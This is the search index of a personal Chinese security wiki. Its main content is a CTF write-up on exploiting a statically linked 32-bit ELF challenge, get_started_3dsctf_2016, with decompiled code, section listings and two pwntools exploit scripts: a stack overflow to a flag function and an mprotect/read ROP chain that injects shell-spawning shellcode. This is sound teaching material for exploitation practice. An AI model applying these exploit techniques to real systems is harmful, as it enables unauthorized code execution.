{"config":{"lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"\u5173\u4e8ewiki ___________ _____.___. __ __.__ ____ __.__ / _____/ | _\\__ | | ____ / \\ / \\__| |/ _|__| \\_____ \\| |/ // | |/ __ \\ \\ \\/\\/ / | < | | / \\ < \\____ \\ ___/ \\ /| | | \\| | /_______ /__|_ \\/ ______|\\___ > \\__/\\ / |__|____|__ \\__| \\/ \\/\\/ \\/ \\/ \\/ Site Blog: SkYe's Blog WiKi: SkYe's WiKi Github: @skyedai910 CSDN: @SkYe231 Chart Email:skye437231@gmail.com WiKi\u7528\u7684\u662f mkdocs \uff0c\u6258\u7ba1\u4e8e github pages \u3002","title":"Home"},{"location":"#wiki","text":"___________ _____.___. __ __.__ ____ __.__ / _____/ | _\\__ | | ____ / \\ / \\__| |/ _|__| \\_____ \\| |/ // | |/ __ \\ \\ \\/\\/ / | < | | / \\ < \\____ \\ ___/ \\ /| | | \\| | /_______ /__|_ \\/ ______|\\___ > \\__/\\ / |__|____|__ \\__| \\/ \\/\\/ \\/ \\/ \\/","title":"\u5173\u4e8ewiki"},{"location":"#site","text":"Blog: SkYe's Blog WiKi: SkYe's WiKi Github: @skyedai910 CSDN: @SkYe231","title":"Site"},{"location":"#chart","text":"Email:skye437231@gmail.com WiKi\u7528\u7684\u662f mkdocs \uff0c\u6258\u7ba1\u4e8e github pages \u3002","title":"Chart"},{"location":"about/","text":"___________ _____.___. __ __.__ ____ __.__ / _____/ | _\\__ | | ____ / \\ / \\__| |/ _|__| \\_____ \\| |/ // | |/ __ \\ \\ \\/\\/ / | < | | / \\ < \\____ \\ ___/ \\ /| | | \\| | /_______ /__|_ \\/ ______|\\___ > \\__/\\ / |__|____|__ \\__| \\/ \\/\\/ \\/ \\/ \\/ \u6e23\u6e23\u81ea\u8ff0 \u5e7f\u5dde\u8fa3\u9e21\u4e8c\u672c\u7684\u5927\u4e8c\u751f\uff0c\u8bf7\u5404\u4f4d\u5927\u4f6c\u591a\u591a\u6307\u6559\u3002 Blog\u5199\u4e86\u4ec0\u4e48\u5c31\u53d1\u4ec0\u4e48\uff0c\u5185\u5bb9\u6e23\u4e14\u6742\u3002\u77e5\u8bc6\u6574\u7406\u5728 WiKi \u3002 \u95e8\u6237\u7f51\u7ad9 Blog: SkYe's Blog WiKi: SkYe's WiKi Github: @skyedai910 CSDN: @SkYe231 \u8054\u7cfb\u65b9\u5f0f Email:skye437231@gmail.com","title":"About"},{"location":"about/#_1","text":"\u5e7f\u5dde\u8fa3\u9e21\u4e8c\u672c\u7684\u5927\u4e8c\u751f\uff0c\u8bf7\u5404\u4f4d\u5927\u4f6c\u591a\u591a\u6307\u6559\u3002 Blog\u5199\u4e86\u4ec0\u4e48\u5c31\u53d1\u4ec0\u4e48\uff0c\u5185\u5bb9\u6e23\u4e14\u6742\u3002\u77e5\u8bc6\u6574\u7406\u5728 WiKi \u3002","title":"\u6e23\u6e23\u81ea\u8ff0"},{"location":"about/#_2","text":"Blog: SkYe's Blog WiKi: SkYe's WiKi Github: @skyedai910 CSDN: @SkYe231","title":"\u95e8\u6237\u7f51\u7ad9"},{"location":"about/#_3","text":"Email:skye437231@gmail.com","title":"\u8054\u7cfb\u65b9\u5f0f"},{"location":"ELFSecurityProtection/ELFSecurityProtectionSummary/","text":"ELF\u5b89\u5168\u9632\u5fa1\u673a\u5236\u5c0f\u7ed3","title":"ELF\u5b89\u5168\u9632\u5fa1\u673a\u5236\u5c0f\u7ed3"},{"location":"ELFSecurityProtection/ELFSecurityProtectionSummary/#elf","text":"","title":"ELF\u5b89\u5168\u9632\u5fa1\u673a\u5236\u5c0f\u7ed3"},{"location":"linker/statically_linked/","text":"\u9759\u6001\u94fe\u63a5\u7a0b\u5e8f\u5229\u7528 \u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u9759\u6001\u94fe\u63a5\u7684\u7a0b\u5e8f\u5f88\u5c11\u51fa\u73b0\uff0c\u4f46\u662f\u4e5f\u6709\u4e00\u4e9b\u3002\u8fd9\u7c7b elf \u7684\u6f0f\u6d1e\u5229\u7528\uff0c\u4e3b\u8981\u8fd8\u662f\u4f9d\u9760\u7a0b\u5e8f\u672c\u8eab\u548c\u7528\u6237\u8f93\u5165\u3002 \u7a0b\u5e8f\u672c\u8eab\u7684\u5229\u7528\u5c31\u662f\u9884\u7559\u7684\u540e\u95e8\u51fd\u6570\uff08system\uff09\u548c\u5b57\u7b26\u4e32\uff08/bin/sh\uff09\u3002\u5982\u679c\u6709\u8fd9\u4e9b\u9884\u7559\uff0c\u9898\u76ee\u96be\u5ea6\u5e94\u8be5\u4e0d\u5927\uff0c\u53ea\u8981\u8bbe\u6cd5\u63a7\u5236\u7a0b\u5e8f\u6d41\u5230\u540e\u95e8\u4e0a\u3002 \u5982\u679c\u6ca1\u6709\u9884\u7559\u7684\u540e\u95e8\uff0c\u5f88\u6709\u53ef\u80fd\u662f\u9700\u8981\u4f9d\u9760\u7528\u6237\u8f93\u5165\u5185\u5bb9\u7ed3\u5408\u7a0b\u5e8f\u672c\u8eab gadget \u53bb\u6784\u9020\u8c03\u7528\uff0c\u4e5f\u5c31\u662f\u624b\u5de5\u6784\u9020 onegadget \u3002 \u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u4f1a\u53bb libc \u91cc\u9762\u627e\u5229\u7528\u7684\u51fd\u6570\u548c\u5b57\u7b26\u4e32\uff0c\u4f8b\u5982\uff1asystem\u3002\u4f46 \u9759\u6001\u94fe\u63a5\u4e0d\u4f1a\u5230 libc \u627e\u51fd\u6570\uff0c\u9759\u6001\u94fe\u63a5\u7a0b\u5e8f\u8fd0\u884c\u65f6\u8981\u7528\u5230\u7684\u5168\u90e8\u4e1c\u897f\u90fd\u5df2\u7ecf\u5305\u542b\u5728 ELF \u6587\u4ef6\u91cc\uff0c\u6240\u4ee5\u653b\u51fb\u8005\u80fd\u5229\u7528\u7684\u53ea\u6709 ELF \u6587\u4ef6\u7684\u4e1c\u897f\u3002ret2libc \u7b49\u7b49\u653b\u51fb\u65b9\u6cd5\u5c31\u4e0e\u9759\u6001\u94fe\u63a5\u7a0b\u5e8f\u65e0\u7f18\u3002 \u5b9e\u9a8c\u4e00\uff1aget_started_3dsctf_2016 \u8fd9\u662f\u4e00\u6761 32 \u4f4d\u9759\u6001\u94fe\u63a5\u7684\u6808\u6ea2\u51fa\u9898\u76ee\uff0c\u9898\u76ee\u5728 BUU \u4e0a\u6709\u5b9e\u9a8c\u73af\u5883\u3002\u672c\u5730\u548c\u8fdc\u7a0b\u662f\u91c7\u7528\u4e24\u79cd\u89e3\u51b3\u65b9\u6cd5\u3002 \u672c\u5730\u5c31\u662f\u53ef\u4ee5\u5229\u7528\u9884\u7559\u7684\u540e\u95e8\u89e3\u51b3\uff0c\u8fdc\u7a0b\u5229\u7528\u9700\u8981\u7ed3\u5408 ELF \u91cc\u7684\u4e00\u4e2a\u51fd\u6570\u2014\u2014mprotect \u548c \u7528\u6237\u8f93\u5165\u5185\u5bb9\u3002 \u5206\u6790 \u4fdd\u62a4\u60c5\u51b5 32 \u4f4d\u53ea\u5f00\u542f\u4e86 NX Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) \u7f16\u8bd1\u60c5\u51b5 \u8fd9\u662f\u4e00\u6761\u9759\u6001\u94fe\u63a5\u7684\u9898\uff0c\u4e5f\u5c31\u662f\u7528\u4e0d\u5230 libc \u3002 $ file get_started_3dsctf_2016 get_started_3dsctf_2016: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, not stripped \u6f0f\u6d1e\u51fd\u6570 main \u51fd\u6570\u91cc\u9762\u8c03\u7528\u4e86 gets \u8fdb\u884c\u8bfb\u53d6\uff0c\u6ca1\u6709\u5bf9\u957f\u5ea6\u9650\u5236\uff0c\u53ef\u9020\u6210\u6808\u6ea2\u51fa\uff1a int __cdecl main(int argc, const char **argv, const char **envp) { char v4; // [esp+4h] [ebp-38h] printf(\"Qual a palavrinha magica? \", v4); gets(&v4); return 0; } \u9898\u76ee\u9884\u7559\u4e86\u540e\u95e8\u51fd\u6570 get_flag \uff0c\u6709\u4e24\u4e2a\u5224\u65ad\u4f20\u53c2\u7684\u65f6\u5019\u4f20\u8fdb\u53bb\u5c31\u884c\u4e86\uff1a void __cdecl get_flag(int a1, int a2) { int v2; // eax int v3; // esi unsigned __int8 v4; // al int v5; // ecx unsigned __int8 v6; // al if ( a1 == 0x308CD64F && a2 == 0x195719D1 ) { v2 = fopen(\"flag.txt\", \"rt\"); v3 = v2; v4 = getc(v2); if ( v4 != 0xFF ) { v5 = (char)v4; do { putchar(v5); v6 = getc(v3); v5 = (char)v6; } while ( v6 != 255 ); } fclose(v3); } } \u5230\u8fd9\u91cc\u7684\u57fa\u672c\u601d\u8def\u662f\uff1a\u6808\u6ea2\u51fa\u63a7\u5236 eip \u8df3\u8f6c\u540e\u95e8\uff0c\u4e5f\u5c31\u5f97\u5230\u4e86 \u4ec5\u6808\u6ea2\u51fa\u7684 exp \uff0c\u8fdc\u7a0b\u65e0\u6cd5 getshell \u3002 \u601d\u8def \u524d\u9762\u5206\u6790\u8bf4\u4e86\u561b\uff0c\u65e0\u6cd5\u901a\u8fc7\u6808\u6ea2\u51fa\u8df3\u8f6c\u540e\u95e8\u3002\u8f6c\u6362\u4e00\u4e0b\u601d\u8def\uff0c\u6ea2\u51fa\u7a7a\u95f4\u4e0d\u9650\u3002\u5c06 shellcode \u5199\u5230\u975e\u6808\u4e0a\u7684\u5730\u65b9\uff0c\u7136\u540e\u7528 mprotect \u7ed9\u5185\u5b58\u6bb5\u52a0\u4e0a\u4e00\u4e2a\u6267\u884c\u6743\u9650\uff0c\u5728\u63a7\u5236\u7a0b\u5e8f\u6d41\u8df3\u8f6c\u5230\u4e0a\u9762\u3002 mprotect \u53c2\u6570\u5982\u4e0b\uff1a int mprotect(void *addr, size_t len, int prot); addr \u5185\u5b58\u542f\u59cb\u5730\u5740 len \u4fee\u6539\u5185\u5b58\u7684\u957f\u5ea6 prot \u5185\u5b58\u7684\u6743\u9650 prot \u7684\u503c\u4e3a 7\uff08rwx\uff09\uff0c\u91cd\u70b9\u662f\u8d4b\u4e88\u6743\u9650\u7684\u5730\u5740\uff0c\u8981\u627e\u4e00\u4e2a\u6709\u8bfb\u5199\u6743\u9650\u7684\u5730\u5740\uff0c\u7136\u540e\u518d\u7ed9\u4e88\u6267\u884c\u6743\u9650\u3002\u8fd9\u91cc ida \u67e5\u51fa\u6765\u7684\u5185\u5b58\u6bb5\u6743\u9650\u4e0e\u5b9e\u9645\u6709\u51fa\u5165\uff0cida \u91cc\u9762 bss \u6bb5\u662f\u6709\u8bfb\u5199\u6743\u9650\u7684\uff1a \u5b9e\u9645\u8bd5\u4e86\u4e00\u4e0b\uff0c\u62a5\u9519\u4fee\u6539\u4e0d\u4e86\u3002\u7136\u540e\u7528 gdb \u67e5\u770b\uff08\u6307\u4ee4\uff1amaintenance info sections\uff09\uff1a pwndbg> maintenance info sections Exec file: `/home/skye/buu/get_started_3dsctf_2016/get_started_3dsctf_2016', file type elf32-i386. [0] 0x80480f4->0x8048114 at 0x000000f4: .note.ABI-tag ALLOC LOAD READONLY DATA HAS_CONTENTS [1] 0x8048114->0x804818c at 0x00000114: .rel.plt ALLOC LOAD READONLY DATA HAS_CONTENTS [2] 0x804818c->0x80481af at 0x0000018c: .init ALLOC LOAD READONLY CODE HAS_CONTENTS \u2026\u2026 [21] 0x80eb000->0x80eb048 at 0x000a2000: .got.plt ALLOC LOAD DATA HAS_CONTENTS [22] 0x80eb060->0x80ebf80 at 0x000a2060: .data ALLOC LOAD DATA HAS_CONTENTS [23] 0x80ebf80->0x80ecd8c at 0x000a2f80: .bss ALLOC \u2026\u2026 \u6700\u540e\u9009\u5b9a\u7684\u5c06 shellcode \u5b58\u653e\u5728 .got.plt \u3002\u6240\u4ee5\u9700\u8981\u6784\u9020\u51fa\uff1a ''' int mprotect(.got.plt\u5730\u5740, \u591f\u653eshellcode\u7684\u5927\u5c0f, 7); ''' payload += p32(mprotect_addr) + p32(got_plt) + p32(0x200) + p32(0x7) \u7136\u540e\u5c31\u662f\u5c31\u662f\u6784\u9020 read \u8f93\u5165 shellcode \u5230 .got.plt \u4e0a\u9762\uff0c\u63a5\u7740\u8df3\u8f6c\u5230 .got.plt \u5373\u53ef\uff1a payload += p32(read_addr) + p32(got_plt) + p32(0) + p32(got_plt) + p32(0x200) \u5b9e\u9645\u8fd0\u884c\u540e\u4f1a\u5361\u5728 read \u51fd\u6570\uff0c\u901a\u8fc7\u8c03\u8bd5\u5bf9\u6bd4\u6b63\u5e38 read \u51fd\u6570\uff0c\u662f\u51e0\u4e2a\u5bc4\u5b58\u5668\u7684\u95ee\u9898\u3002\u5728 mprotect \u8fd0\u884c\u5b8c\u4e4b\u540e\uff0c\u9700\u8981 pop \u5b58\u653e 3 \u4e2a\u53c2\u6570\u7684\u5bc4\u5b58\u5668\uff0c\u7528 ROPgadget \u627e\u5c31\u884c\u4e86\u3002 read \u4e5f\u6709 3 \u4e2a\u53c2\u6570\uff0c\u4f46\u662f\u5b9e\u9645\u6d4b\u8bd5\u4e0d\u9700\u8981 popgadget \u5904\u7406\uff0c\u76f4\u63a5\u53ef\u4ee5\u8df3\u8f6c\u5c31\u7701\u7565\u3002 \u6574\u4f53 payload \u6784\u9020\uff1a payload = 'a'*0x38 payload += p32(mprotect_addr) + p32(pop3_ret) + p32(got_plt) + p32(0x200) + p32(0x7) payload += p32(read_addr) + p32(got_plt) + p32(0) + p32(got_plt) + p32(0x200) exp \u4ec5\u6808\u6ea2\u51fa from pwn import * context.log_level = 'debug' p = process(\"./get_started_3dsctf_2016\") #p = remote(\"node3.buuoj.cn\",26536) elf = ELF(\"./get_started_3dsctf_2016\") get_flag = elf.sym['get_flag'] payload = 'a'*0x38# + 'b'*0x4 payload += p32(get_flag)+p32(0xdeadbeef)+p32(0x308CD64F)+p32(0x195719D1) #p.recvuntil(\"Qual\") gdb.attach(p) p.sendline(payload) p.interactive() \u6808\u6ea2\u51fa+mprotect \u8fd9\u91cc\u83b7\u53d6\u9759\u6001\u7a0b\u5e8f\u7684\u51fd\u6570\u5730\u5740\u548c\u52a8\u6001\u94fe\u63a5\u7684\u6709\u533a\u522b\uff1a elf = ELF(\"./get_started_3dsctf_2016\") # \u82e5\u662f\u52a8\u6001\u94fe\u63a5 puts_plt = elf.plt['read'] # \u82e5\u662f\u9759\u6001\u94fe\u63a5 puts_plt = elf.sym['read'] # \u65b9\u6cd5\u4e00 puts_plt = elf.symbols['read'] # \u65b9\u6cd5\u4e8c from pwn import * context.log_level = 'debug' p = process(\"./get_started_3dsctf_2016\") #p = remote(\"node3.buuoj.cn\",28471) elf = ELF(\"./get_started_3dsctf_2016\") pop3_ret = 0x804951D shellcode = asm(shellcraft.sh(),arch = 'i386', os = 'linux') mprotect_addr = elf.symbols['mprotect'] read_addr = elf.symbols['read'] got_plt = 0x80EB000 payload = 'a'*0x38 payload += p32(mprotect_addr) + p32(pop3_ret) + p32(got_plt) + p32(0x200) + p32(0x7) payload += p32(read_addr) + p32(got_plt) + p32(0) + p32(got_plt) + p32(0x200) #payload += p32(got_plt) gdb.attach(p) p.sendline(payload) p.sendline(shellcode) p.interactive() \u5b9e\u9a8c\u4e8c\uff1a2017 \u6e56\u6e58\u676f pwn300 32 \u4f4d\u9759\u6001\u94fe\u63a5\u9898\u76ee\uff0c\u9700\u8981\u7ed3\u5408\u7528\u6237\u8f93\u5165\u7684\u5185\u5bb9\uff0c\u7136\u540e\u8c03\u7528 ELF \u81ea\u8eab\u7684 gadget \u6784\u5efa\u7cfb\u7edf\u8c03\u7528\u3002","title":"\u9759\u6001\u94fe\u63a5\u7a0b\u5e8f\u5229\u7528"},{"location":"linker/statically_linked/#_1","text":"\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u9759\u6001\u94fe\u63a5\u7684\u7a0b\u5e8f\u5f88\u5c11\u51fa\u73b0\uff0c\u4f46\u662f\u4e5f\u6709\u4e00\u4e9b\u3002\u8fd9\u7c7b elf \u7684\u6f0f\u6d1e\u5229\u7528\uff0c\u4e3b\u8981\u8fd8\u662f\u4f9d\u9760\u7a0b\u5e8f\u672c\u8eab\u548c\u7528\u6237\u8f93\u5165\u3002 \u7a0b\u5e8f\u672c\u8eab\u7684\u5229\u7528\u5c31\u662f\u9884\u7559\u7684\u540e\u95e8\u51fd\u6570\uff08system\uff09\u548c\u5b57\u7b26\u4e32\uff08/bin/sh\uff09\u3002\u5982\u679c\u6709\u8fd9\u4e9b\u9884\u7559\uff0c\u9898\u76ee\u96be\u5ea6\u5e94\u8be5\u4e0d\u5927\uff0c\u53ea\u8981\u8bbe\u6cd5\u63a7\u5236\u7a0b\u5e8f\u6d41\u5230\u540e\u95e8\u4e0a\u3002 \u5982\u679c\u6ca1\u6709\u9884\u7559\u7684\u540e\u95e8\uff0c\u5f88\u6709\u53ef\u80fd\u662f\u9700\u8981\u4f9d\u9760\u7528\u6237\u8f93\u5165\u5185\u5bb9\u7ed3\u5408\u7a0b\u5e8f\u672c\u8eab gadget \u53bb\u6784\u9020\u8c03\u7528\uff0c\u4e5f\u5c31\u662f\u624b\u5de5\u6784\u9020 onegadget \u3002 \u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u4f1a\u53bb libc \u91cc\u9762\u627e\u5229\u7528\u7684\u51fd\u6570\u548c\u5b57\u7b26\u4e32\uff0c\u4f8b\u5982\uff1asystem\u3002\u4f46 \u9759\u6001\u94fe\u63a5\u4e0d\u4f1a\u5230 libc \u627e\u51fd\u6570\uff0c\u9759\u6001\u94fe\u63a5\u7a0b\u5e8f\u8fd0\u884c\u65f6\u8981\u7528\u5230\u7684\u5168\u90e8\u4e1c\u897f\u90fd\u5df2\u7ecf\u5305\u542b\u5728 ELF \u6587\u4ef6\u91cc\uff0c\u6240\u4ee5\u653b\u51fb\u8005\u80fd\u5229\u7528\u7684\u53ea\u6709 ELF \u6587\u4ef6\u7684\u4e1c\u897f\u3002ret2libc \u7b49\u7b49\u653b\u51fb\u65b9\u6cd5\u5c31\u4e0e\u9759\u6001\u94fe\u63a5\u7a0b\u5e8f\u65e0\u7f18\u3002","title":"\u9759\u6001\u94fe\u63a5\u7a0b\u5e8f\u5229\u7528"},{"location":"linker/statically_linked/#get_started_3dsctf_2016","text":"\u8fd9\u662f\u4e00\u6761 32 \u4f4d\u9759\u6001\u94fe\u63a5\u7684\u6808\u6ea2\u51fa\u9898\u76ee\uff0c\u9898\u76ee\u5728 BUU \u4e0a\u6709\u5b9e\u9a8c\u73af\u5883\u3002\u672c\u5730\u548c\u8fdc\u7a0b\u662f\u91c7\u7528\u4e24\u79cd\u89e3\u51b3\u65b9\u6cd5\u3002 \u672c\u5730\u5c31\u662f\u53ef\u4ee5\u5229\u7528\u9884\u7559\u7684\u540e\u95e8\u89e3\u51b3\uff0c\u8fdc\u7a0b\u5229\u7528\u9700\u8981\u7ed3\u5408 ELF \u91cc\u7684\u4e00\u4e2a\u51fd\u6570\u2014\u2014mprotect \u548c \u7528\u6237\u8f93\u5165\u5185\u5bb9\u3002","title":"\u5b9e\u9a8c\u4e00\uff1aget_started_3dsctf_2016"},{"location":"linker/statically_linked/#_2","text":"","title":"\u5206\u6790"},{"location":"linker/statically_linked/#_3","text":"32 \u4f4d\u53ea\u5f00\u542f\u4e86 NX Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000)","title":"\u4fdd\u62a4\u60c5\u51b5"},{"location":"linker/statically_linked/#_4","text":"\u8fd9\u662f\u4e00\u6761\u9759\u6001\u94fe\u63a5\u7684\u9898\uff0c\u4e5f\u5c31\u662f\u7528\u4e0d\u5230 libc \u3002 $ file get_started_3dsctf_2016 get_started_3dsctf_2016: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, not stripped","title":"\u7f16\u8bd1\u60c5\u51b5"},{"location":"linker/statically_linked/#_5","text":"main \u51fd\u6570\u91cc\u9762\u8c03\u7528\u4e86 gets \u8fdb\u884c\u8bfb\u53d6\uff0c\u6ca1\u6709\u5bf9\u957f\u5ea6\u9650\u5236\uff0c\u53ef\u9020\u6210\u6808\u6ea2\u51fa\uff1a int __cdecl main(int argc, const char **argv, const char **envp) { char v4; // [esp+4h] [ebp-38h] printf(\"Qual a palavrinha magica? \", v4); gets(&v4); return 0; } \u9898\u76ee\u9884\u7559\u4e86\u540e\u95e8\u51fd\u6570 get_flag \uff0c\u6709\u4e24\u4e2a\u5224\u65ad\u4f20\u53c2\u7684\u65f6\u5019\u4f20\u8fdb\u53bb\u5c31\u884c\u4e86\uff1a void __cdecl get_flag(int a1, int a2) { int v2; // eax int v3; // esi unsigned __int8 v4; // al int v5; // ecx unsigned __int8 v6; // al if ( a1 == 0x308CD64F && a2 == 0x195719D1 ) { v2 = fopen(\"flag.txt\", \"rt\"); v3 = v2; v4 = getc(v2); if ( v4 != 0xFF ) { v5 = (char)v4; do { putchar(v5); v6 = getc(v3); v5 = (char)v6; } while ( v6 != 255 ); } fclose(v3); } } \u5230\u8fd9\u91cc\u7684\u57fa\u672c\u601d\u8def\u662f\uff1a\u6808\u6ea2\u51fa\u63a7\u5236 eip \u8df3\u8f6c\u540e\u95e8\uff0c\u4e5f\u5c31\u5f97\u5230\u4e86 \u4ec5\u6808\u6ea2\u51fa\u7684 exp \uff0c\u8fdc\u7a0b\u65e0\u6cd5 getshell \u3002","title":"\u6f0f\u6d1e\u51fd\u6570"},{"location":"linker/statically_linked/#_6","text":"\u524d\u9762\u5206\u6790\u8bf4\u4e86\u561b\uff0c\u65e0\u6cd5\u901a\u8fc7\u6808\u6ea2\u51fa\u8df3\u8f6c\u540e\u95e8\u3002\u8f6c\u6362\u4e00\u4e0b\u601d\u8def\uff0c\u6ea2\u51fa\u7a7a\u95f4\u4e0d\u9650\u3002\u5c06 shellcode \u5199\u5230\u975e\u6808\u4e0a\u7684\u5730\u65b9\uff0c\u7136\u540e\u7528 mprotect \u7ed9\u5185\u5b58\u6bb5\u52a0\u4e0a\u4e00\u4e2a\u6267\u884c\u6743\u9650\uff0c\u5728\u63a7\u5236\u7a0b\u5e8f\u6d41\u8df3\u8f6c\u5230\u4e0a\u9762\u3002 mprotect \u53c2\u6570\u5982\u4e0b\uff1a int mprotect(void *addr, size_t len, int prot); addr \u5185\u5b58\u542f\u59cb\u5730\u5740 len \u4fee\u6539\u5185\u5b58\u7684\u957f\u5ea6 prot \u5185\u5b58\u7684\u6743\u9650 prot \u7684\u503c\u4e3a 7\uff08rwx\uff09\uff0c\u91cd\u70b9\u662f\u8d4b\u4e88\u6743\u9650\u7684\u5730\u5740\uff0c\u8981\u627e\u4e00\u4e2a\u6709\u8bfb\u5199\u6743\u9650\u7684\u5730\u5740\uff0c\u7136\u540e\u518d\u7ed9\u4e88\u6267\u884c\u6743\u9650\u3002\u8fd9\u91cc ida \u67e5\u51fa\u6765\u7684\u5185\u5b58\u6bb5\u6743\u9650\u4e0e\u5b9e\u9645\u6709\u51fa\u5165\uff0cida \u91cc\u9762 bss \u6bb5\u662f\u6709\u8bfb\u5199\u6743\u9650\u7684\uff1a \u5b9e\u9645\u8bd5\u4e86\u4e00\u4e0b\uff0c\u62a5\u9519\u4fee\u6539\u4e0d\u4e86\u3002\u7136\u540e\u7528 gdb \u67e5\u770b\uff08\u6307\u4ee4\uff1amaintenance info sections\uff09\uff1a pwndbg> maintenance info sections Exec file: `/home/skye/buu/get_started_3dsctf_2016/get_started_3dsctf_2016', file type elf32-i386. [0] 0x80480f4->0x8048114 at 0x000000f4: .note.ABI-tag ALLOC LOAD READONLY DATA HAS_CONTENTS [1] 0x8048114->0x804818c at 0x00000114: .rel.plt ALLOC LOAD READONLY DATA HAS_CONTENTS [2] 0x804818c->0x80481af at 0x0000018c: .init ALLOC LOAD READONLY CODE HAS_CONTENTS \u2026\u2026 [21] 0x80eb000->0x80eb048 at 0x000a2000: .got.plt ALLOC LOAD DATA HAS_CONTENTS [22] 0x80eb060->0x80ebf80 at 0x000a2060: .data ALLOC LOAD DATA HAS_CONTENTS [23] 0x80ebf80->0x80ecd8c at 0x000a2f80: .bss ALLOC \u2026\u2026 \u6700\u540e\u9009\u5b9a\u7684\u5c06 shellcode \u5b58\u653e\u5728 .got.plt \u3002\u6240\u4ee5\u9700\u8981\u6784\u9020\u51fa\uff1a ''' int mprotect(.got.plt\u5730\u5740, \u591f\u653eshellcode\u7684\u5927\u5c0f, 7); ''' payload += p32(mprotect_addr) + p32(got_plt) + p32(0x200) + p32(0x7) \u7136\u540e\u5c31\u662f\u5c31\u662f\u6784\u9020 read \u8f93\u5165 shellcode \u5230 .got.plt \u4e0a\u9762\uff0c\u63a5\u7740\u8df3\u8f6c\u5230 .got.plt \u5373\u53ef\uff1a payload += p32(read_addr) + p32(got_plt) + p32(0) + p32(got_plt) + p32(0x200) \u5b9e\u9645\u8fd0\u884c\u540e\u4f1a\u5361\u5728 read \u51fd\u6570\uff0c\u901a\u8fc7\u8c03\u8bd5\u5bf9\u6bd4\u6b63\u5e38 read \u51fd\u6570\uff0c\u662f\u51e0\u4e2a\u5bc4\u5b58\u5668\u7684\u95ee\u9898\u3002\u5728 mprotect \u8fd0\u884c\u5b8c\u4e4b\u540e\uff0c\u9700\u8981 pop \u5b58\u653e 3 \u4e2a\u53c2\u6570\u7684\u5bc4\u5b58\u5668\uff0c\u7528 ROPgadget \u627e\u5c31\u884c\u4e86\u3002 read \u4e5f\u6709 3 \u4e2a\u53c2\u6570\uff0c\u4f46\u662f\u5b9e\u9645\u6d4b\u8bd5\u4e0d\u9700\u8981 popgadget \u5904\u7406\uff0c\u76f4\u63a5\u53ef\u4ee5\u8df3\u8f6c\u5c31\u7701\u7565\u3002 \u6574\u4f53 payload \u6784\u9020\uff1a payload = 'a'*0x38 payload += p32(mprotect_addr) + p32(pop3_ret) + p32(got_plt) + p32(0x200) + p32(0x7) payload += p32(read_addr) + p32(got_plt) + p32(0) + p32(got_plt) + p32(0x200)","title":"\u601d\u8def"},{"location":"linker/statically_linked/#exp","text":"","title":"exp"},{"location":"linker/statically_linked/#_7","text":"from pwn import * context.log_level = 'debug' p = process(\"./get_started_3dsctf_2016\") #p = remote(\"node3.buuoj.cn\",26536) elf = ELF(\"./get_started_3dsctf_2016\") get_flag = elf.sym['get_flag'] payload = 'a'*0x38# + 'b'*0x4 payload += p32(get_flag)+p32(0xdeadbeef)+p32(0x308CD64F)+p32(0x195719D1) #p.recvuntil(\"Qual\") gdb.attach(p) p.sendline(payload) p.interactive()","title":"\u4ec5\u6808\u6ea2\u51fa"},{"location":"linker/statically_linked/#mprotect","text":"\u8fd9\u91cc\u83b7\u53d6\u9759\u6001\u7a0b\u5e8f\u7684\u51fd\u6570\u5730\u5740\u548c\u52a8\u6001\u94fe\u63a5\u7684\u6709\u533a\u522b\uff1a elf = ELF(\"./get_started_3dsctf_2016\") # \u82e5\u662f\u52a8\u6001\u94fe\u63a5 puts_plt = elf.plt['read'] # \u82e5\u662f\u9759\u6001\u94fe\u63a5 puts_plt = elf.sym['read'] # \u65b9\u6cd5\u4e00 puts_plt = elf.symbols['read'] # \u65b9\u6cd5\u4e8c from pwn import * context.log_level = 'debug' p = process(\"./get_started_3dsctf_2016\") #p = remote(\"node3.buuoj.cn\",28471) elf = ELF(\"./get_started_3dsctf_2016\") pop3_ret = 0x804951D shellcode = asm(shellcraft.sh(),arch = 'i386', os = 'linux') mprotect_addr = elf.symbols['mprotect'] read_addr = elf.symbols['read'] got_plt = 0x80EB000 payload = 'a'*0x38 payload += p32(mprotect_addr) + p32(pop3_ret) + p32(got_plt) + p32(0x200) + p32(0x7) payload += p32(read_addr) + p32(got_plt) + p32(0) + p32(got_plt) + p32(0x200) #payload += p32(got_plt) gdb.attach(p) p.sendline(payload) p.sendline(shellcode) p.interactive()","title":"\u6808\u6ea2\u51fa+mprotect"},{"location":"linker/statically_linked/#2017-pwn300","text":"32 \u4f4d\u9759\u6001\u94fe\u63a5\u9898\u76ee\uff0c\u9700\u8981\u7ed3\u5408\u7528\u6237\u8f93\u5165\u7684\u5185\u5bb9\uff0c\u7136\u540e\u8c03\u7528 ELF \u81ea\u8eab\u7684 gadget \u6784\u5efa\u7cfb\u7edf\u8c03\u7528\u3002","title":"\u5b9e\u9a8c\u4e8c\uff1a2017 \u6e56\u6e58\u676f pwn300"}]}